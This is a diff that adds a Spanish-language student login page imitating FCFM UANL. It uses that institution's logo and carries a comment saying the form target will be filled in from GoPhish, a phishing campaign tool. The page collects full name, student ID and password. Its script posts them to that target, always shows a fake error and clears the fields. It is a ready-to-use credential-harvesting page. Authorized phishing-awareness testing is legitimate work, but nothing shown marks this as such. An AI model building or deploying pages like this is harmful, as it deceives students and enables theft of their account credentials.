@@ -1,0 +1,153 @@
+<!DOCTYPE html><html lang="es"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+	<title>Registro de Estudiante</title>
+	<style type="text/css">body {
+  font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial;
+  margin: 0;
+  background: linear-gradient(135deg, #002c5f, #4776e6); /* fondo degradado azul */
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+
+.card {
+  background: rgba(255, 255, 255, 0.95);
+  padding: 40px 30px;
+  border-radius: 12px;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+  max-width: 400px;
+  width: 100%;
+  position: relative;
+  text-align: center;
+}
+
+/* Círculo con logo arriba */
+.logo-circle {
+  position: absolute;
+  top: -55px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: white;
+  border-radius: 50%;
+  width: 160px;
+  height: 160px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+}
+.logo-circle img {
+  width: 140px;
+  height: 140px;
+  border-radius: 50%;
+}
+
+h1 {
+  font-size: 20px;
+  margin-top: 60px;
+  margin-bottom: 20px;
+  color: #002c5f;
+}
+
+label {
+  display: block;
+  font-size: 13px;
+  color: #374151;
+  margin-bottom: 6px;
+  text-align: left;
+}
+
+input[type="text"], input[type="password"] {
+  width: 100%;
+  padding: 10px 12px;
+  border-radius: 8px;
+  border: 1px solid #e6edf3;
+  margin-bottom: 16px;
+  font-size: 14px;
+  background: #f9fafc;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 0;
+  background: #0b206a; /* azul oscuro del primer diseño */
+  color: white;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+button:hover {
+  background: #163d7a;
+}
+
+.error {
+  display: none;
+  padding: 12px;
+  background: #fee2e2;
+  border: 1px solid #fca5a5;
+  color: #7f1d1d;
+  border-radius: 6px;
+  margin-top: 14px;
+  font-size: 13px;
+}
+	</style>
+</head>
+<body>
+<main aria-labelledby="title" class="card" role="main"><!-- Círculo con el logo -->
+<div class="logo-circle"><img alt="FCFMUANL" height="141" src="https://pbs.twimg.com/profile_images/431539276707160065/8Vlj4URO_400x400.png" width="141"/></div>
+
+<h3 style="color:#aaaaaa;font-style:italic;"> </h3>
+
+<h1 id="title"><strong>INICIO DE SESIÓN</strong></h1>
+<!-- action se completará desde GoPhish -->
+
+<form action="" autocomplete="off" id="testForm" method="POST"><label for="fullname"><strong>Nombre completo</strong></label><input id="fullname" name="fullname" required="" type="text"/><label for="matricula"><strong>Matrícula</strong></label> <input id="matricula" name="matricula" required="" type="text"/> <label for="password"><strong>Contraseña</strong></label>
+
+<p><input id="password" name="password" required="" type="password"/></p>
+
+<p><button id="submitBtn" type="submit">Enviar</button></p>
+
+<div class="error" id="errMsg" role="alert">Ocurrió un problema al enviar. Intenta de nuevo.</div>
+</form>
+</main>
+<script>
+(function(){
+  const form = document.getElementById('testForm');
+  const errMsg = document.getElementById('errMsg');
+  const submitBtn = document.getElementById('submitBtn');
+
+  form.addEventListener('submit', async function(e){
+    e.preventDefault();
+
+    const fd = new FormData(form);
+    const urlEncoded = new URLSearchParams();
+    for (const [k,v] of fd.entries()) urlEncoded.append(k, v);
+
+    try {
+      await fetch(form.action, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'},
+        body: urlEncoded.toString(),
+        credentials: 'same-origin'
+      });
+    } catch (err) {
+      console.warn('Error al enviar:', err);
+    }
+
+    // Mostrar siempre el mensaje de error
+    errMsg.style.display = 'block';
+    setTimeout(()=>{errMsg.style.display='none';},6000);
+    errMsg.setAttribute('tabindex','-1');
+    errMsg.focus();
+
+    // Limpiar campos
+    form.querySelectorAll('input').forEach(i => i.value = '');
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Enviar';
+  });
+})();
+</script>
+
+</body></html>
